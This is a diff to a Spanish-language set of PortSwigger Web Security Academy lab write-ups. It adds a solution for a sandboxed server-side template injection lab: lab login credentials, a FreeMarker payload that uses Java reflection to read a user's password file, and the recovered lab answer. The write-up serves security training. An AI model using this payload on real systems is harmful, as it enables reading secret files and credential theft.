@@ -1163,7 +1163,19 @@ Ir a LABID.web-security-academy.net/?message=wrtz{{%23with "s" as |string|}}%0A%
 
 #### Solución encontrada:
 
-## ce7yt92pn5jo8evzdf6hpmi144g0e9zd
+ce7yt92pn5jo8evzdf6hpmi144g0e9zd
+
+### [Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)
+
+#### Descripción
+
+1. Iniciar sesión con las credenciales brindadas (content-manager:C0nt3ntM4n4g3r)
+2. Editar la descripción de un producto, ingresar \${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+3. Convertir el resultado obtenido de bytes en código ASCII a string
+
+#### Solución encontrada:
+
+k67lsge9ztl9117fcefl
 
 ## [Directory traversal](https://portswigger.net/web-security/file-path-traversal)
 
